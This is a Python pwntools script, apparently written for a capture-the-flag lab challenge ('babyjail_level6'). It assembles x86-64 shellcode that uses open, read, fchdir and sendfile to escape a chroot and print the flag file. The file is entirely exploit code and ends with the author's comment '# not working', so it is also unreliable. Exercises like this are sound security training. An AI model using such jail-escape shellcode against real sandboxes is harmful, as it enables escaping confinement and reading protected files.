import pwn

pwn.context.arch = "amd64"
pwn.context.encoding = "latin"

# fchdir -> 81
# open -> 2
# read -> 0
# write -> 40
# send file -> 40
#     {pwn.shellcraft.pushstr("flag")}
    # mov rsi, rsp

# #//{pwn.shellcraft.write(1, 1024, 1024)}
# {pwn.shellcraft.open("rsi", 0)}

# with pwn.process(["/challenge/babyjail_level6", "/"]) as target:
with pwn.process(["sudo", "strace" ,"/challenge/babyjail_level6", "/"]) as target:
    pwn.info(target.readrepeat(1))


    target.send(pwn.asm(f"""

	mov rsi, 0
	lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
	mov rax, 2              #syscall 2 opens file
	syscall

	mov rdi, rax    #file saved in rax from above syscall
	mov rsi, rsp    #move file to readable register
	mov rdx, 100    # reads 100 bytes
	mov rax, 0
	syscall

    {pwn.shellcraft.fchdir(3)}

    
    mov rdi, 1      #write to stdout
	mov rsi, rsp    #moves file to write 
	mov rdx, rax    #reads # of bytes to write
	mov rax, 1
	syscall

    {pwn.shellcraft.sendfile(1, 3, 0, 1024)}


    mov rax, 60
    xor rdi, rdi
    syscall

    flag:
        .ascii "../../flag\0"
    """))

# with pwn.process(["/challenge/babyjail_level6", "/"]) as target:
#     pwn.info(target.readrepeat(1))

#     target.send(pwn.asm(f"""
#     nop
    
#     """))

    pwn.info(target.readrepeat(1))


# not working
